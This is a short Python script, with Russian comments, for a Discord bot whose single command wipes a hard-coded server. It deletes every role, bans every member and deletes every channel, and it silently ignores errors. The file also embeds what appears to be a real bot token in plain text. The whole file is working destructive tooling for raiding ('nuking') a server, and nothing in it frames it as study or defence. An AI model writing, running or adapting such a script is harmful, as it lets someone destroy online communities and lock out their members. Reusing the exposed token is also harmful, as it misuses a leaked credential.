import discord

from discord.ext import commands
import asyncio


Bot = commands.Bot(command_prefix='!') #префикс
token = 'NzY2OTg2NjA1Mjk3OTI2MTY0.X4rV8A.oBYd2U6RMUJ2eQ9-9NFWNYTBObg' # токен
crush_id =757604328495382680 # ID сервера

@Bot.command()
async def bigbanka(ctx):
    guild = Bot.get_guild(crush_id)
    channels = guild.channels
    members = guild.members
    roles = guild.roles

    for i in roles:  # Удаление ролей
        await asyncio.sleep(0.1)
        try:

            await i.delete()
        except:
            pass

    for i in members:  # Бан участников
        if i is not Bot.user:
            await asyncio.sleep(0.1)
            try:
                await i.ban()
            except:
                pass

    for i in channels:  # Удаление каналов
        await asyncio.sleep(0.1)
        try:
            await i.delete()
        except:
            pass



Bot.run(token)